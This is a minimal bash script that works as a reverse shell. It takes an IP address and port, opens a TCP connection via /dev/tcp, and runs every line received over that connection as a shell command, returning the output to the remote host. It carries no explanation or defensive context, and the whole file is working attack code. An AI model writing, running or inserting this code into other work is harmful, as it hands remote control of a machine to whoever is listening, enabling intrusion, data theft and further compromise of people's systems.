#!/usr/bin/env bash

i=$1
p=$2
exec 5<>/dev/tcp/$i/$p
cat <&5 | while read line; do $line 2>&5 >&5; done
